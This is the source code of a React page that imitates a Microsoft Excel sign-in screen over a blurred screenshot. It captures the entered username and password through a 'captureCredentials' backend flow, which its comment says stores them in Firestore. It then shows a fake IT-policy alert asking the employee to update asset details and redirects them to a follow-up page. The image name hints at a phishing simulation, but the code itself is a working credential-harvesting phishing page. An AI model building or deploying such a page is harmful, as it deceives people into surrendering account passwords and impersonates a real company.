'use client';
import { FormEvent, useState } from 'react';
import { captureCredentials } from '@/ai/flows/capture-credentials';

// Make Swal available in the component
declare const Swal: any;

export default function Home() {
  const imageUrl = "https://storage.googleapis.com/fsm-build-artefacts/PhishingSampleAnalysis10June-1.jpg";

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = async (event: FormEvent) => {
    event.preventDefault();
    
    // Capture credentials on the backend (saves to Firestore)
    await captureCredentials({ username, password });
    
    // Show SweetAlert2 prompt and then redirect
    Swal.fire({
      title: "Action Required: Employee Asset Details",
      text: "Please review and update your asset information in accordance with the new IT policy.",
      icon: "info",
      confirmButtonText: "Update Now",
      confirmButtonColor: "#3085d6",
      background: "#fff",
      color: "#333"
    }).then(() => {
      // Redirect to the asset update page after pressing the button
      window.location.href = "/employee-asset-update.html"; 
    });
  };
  
  return (
    <>
      {/* Blurred Image */}
      <img id="blurredImage" src={imageUrl} alt="Blurred screenshot" />

      {/* Login Overlay */}
      <div className="login-overlay" role="main" aria-label="Excel Login Screen">
        
        <h2>Sign in to Excel</h2>
        <form onSubmit={handleSubmit}>
          <input 
            type="text" 
            name="username" 
            placeholder="Email or phone" 
            autoComplete="username" 
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required 
          />
          <input 
            type="password" 
            name="password" 
            placeholder="Password" 
            autoComplete="current-password" 
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required 
          />
          <button type="submit">Sign in</button>
          <small>© Microsoft Corporation</small>
        </form>
      </div>
    </>
  );
}
